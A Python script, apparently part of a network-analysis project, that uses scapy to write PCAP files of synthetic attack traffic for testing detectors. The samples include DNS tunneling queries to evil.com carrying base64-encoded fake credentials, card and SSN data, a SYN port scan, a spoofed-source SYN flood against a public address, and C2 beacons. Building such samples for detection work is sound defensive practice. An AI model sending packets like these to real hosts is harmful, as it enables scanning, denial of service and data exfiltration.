"""
Create Malicious Traffic Samples

This script creates PCAP files with attack patterns to test our detectors!

Attack types:
1. DNS Tunneling (base64 encoded data in DNS queries)
2. Port Scanning (rapid connections to many ports)
3. DDoS Simulation (high packet volume)
4. C2 Beaconing (regular periodic connections)
"""

from scapy.all import *
import os


def create_dns_tunneling_attack():
    """
    Create DNS tunneling attack traffic
    
    Attackers encode data in DNS queries to exfiltrate information
    """
    packets = []
    
    print("🚨 Creating DNS tunneling attack...")
    
    # Normal DNS queries (for baseline)
    normal_domains = [
        "google.com",
        "facebook.com",
        "youtube.com",
        "amazon.com",
        "twitter.com"
    ]
    
    for domain in normal_domains:
        dns = IP(src="192.168.1.100", dst="8.8.8.8") / \
              UDP(sport=RandShort(), dport=53) / \
              DNS(rd=1, qd=DNSQR(qname=domain))
        packets.append(dns)
    
    # Malicious DNS tunneling (base64 encoded data)
    tunneling_queries = [
        "aHR0cHM6Ly9leGFtcGxlLmNvbS9zZWNyZXQ.evil.com",  # base64: https://example.com/secret
        "dXNlcm5hbWU6YWRtaW4gcGFzc3dvcmQ6MTIzNDU.evil.com",  # base64: username:admin password:12345
        "Y3JlZGl0X2NhcmQ6MTIzNC01Njc4LTkwMTI.evil.com",  # base64: credit_card:1234-5678-9012
        "c3NuOjEyMy00NS02Nzg5.evil.com",  # base64: ssn:123-45-6789
        "ZW1haWw6dXNlckBleGFtcGxlLmNvbQ.evil.com",  # base64: email:user@example.com
    ]
    
    for query in tunneling_queries:
        dns = IP(src="192.168.1.100", dst="8.8.8.8") / \
              UDP(sport=RandShort(), dport=53) / \
              DNS(rd=1, qd=DNSQR(qname=query))
        packets.append(dns)
    
    print(f"  ✓ Created {len(packets)} packets ({len(tunneling_queries)} malicious)")
    
    return packets


def create_port_scan_attack():
    """
    Create port scanning attack
    
    Attacker probes many ports to find vulnerabilities
    """
    packets = []
    
    print("🚨 Creating port scan attack...")
    
    target_ip = "10.0.0.50"
    attacker_ip = "192.168.1.200"
    
    # Scan common ports
    ports_to_scan = [21, 22, 23, 25, 80, 110, 143, 443, 445, 3306, 3389, 5432, 8080, 8443]
    
    for port in ports_to_scan:
        # SYN scan (stealth scan)
        syn = IP(src=attacker_ip, dst=target_ip) / \
              TCP(sport=RandShort(), dport=port, flags="S")
        packets.append(syn)
    
    print(f"  ✓ Created {len(packets)} SYN packets (port scan)")
    
    return packets


def create_ddos_simulation():
    """
    Create DDoS attack simulation
    
    Many packets from different IPs to overwhelm target
    """
    packets = []
    
    print("🚨 Creating DDoS simulation...")
    
    target_ip = "93.184.216.34"  # example.com
    
    # SYN flood from spoofed IPs
    for i in range(100):
        # Random source IP (spoofed)
        src_ip = f"10.{RandByte()}.{RandByte()}.{RandByte()}"
        
        syn = IP(src=src_ip, dst=target_ip) / \
              TCP(sport=RandShort(), dport=80, flags="S", seq=RandInt())
        packets.append(syn)
    
    print(f"  ✓ Created {len(packets)} SYN flood packets")
    
    return packets


def create_c2_beaconing():
    """
    Create C2 (Command & Control) beaconing traffic
    
    Malware "phones home" at regular intervals
    """
    packets = []
    
    print("🚨 Creating C2 beaconing traffic...")
    
    infected_host = "192.168.1.42"
    c2_server = "185.220.101.50"  # Suspicious IP
    
    # Regular beacons every ~5 minutes (simulated)
    for i in range(10):
        # Beacon request
        beacon = IP(src=infected_host, dst=c2_server) / \
                 TCP(sport=RandShort(), dport=443, flags="PA") / \
                 Raw(load=b"\x16\x03\x01\x00\x05")  # TLS-like encrypted data
        packets.append(beacon)
    
    print(f"  ✓ Created {len(packets)} C2 beacon packets")
    
    return packets


def main():
    """Create all attack samples"""
    
    output_dir = "data/samples"
    os.makedirs(output_dir, exist_ok=True)
    
    print("="*60)
    print("🔨 CREATING MALICIOUS TRAFFIC SAMPLES")
    print("="*60)
    print()
    
    # Create different attack types
    attacks = {
        'dns_tunneling': create_dns_tunneling_attack(),
        'port_scan': create_port_scan_attack(),
        'ddos': create_ddos_simulation(),
        'c2_beaconing': create_c2_beaconing()
    }
    
    # Save each attack type
    print("\n💾 Saving PCAP files...")
    for attack_name, packets in attacks.items():
        filename = f"{output_dir}/attack_{attack_name}.pcap"
        wrpcap(filename, packets)
        print(f"  ✓ {filename} ({len(packets)} packets)")
    
    # Create combined attack file
    all_packets = []
    for packets in attacks.values():
        all_packets.extend(packets)
    
    combined_file = f"{output_dir}/attack_combined.pcap"
    wrpcap(combined_file, all_packets)
    print(f"  ✓ {combined_file} ({len(all_packets)} packets - ALL ATTACKS)")
    
    print("\n" + "="*60)
    print("✅ ATTACK SAMPLES CREATED")
    print("="*60)
    print("\n🎯 Test the detectors:")
    print("\n  # Detect DNS tunneling")
    print(f"  python analyzer/core/entropy_detector.py")
    print("\n  # Full analysis")
    print(f"  python analyzer/core/integrated_analysis.py {output_dir}/attack_combined.pcap")
    print()


if __name__ == '__main__':
    main()
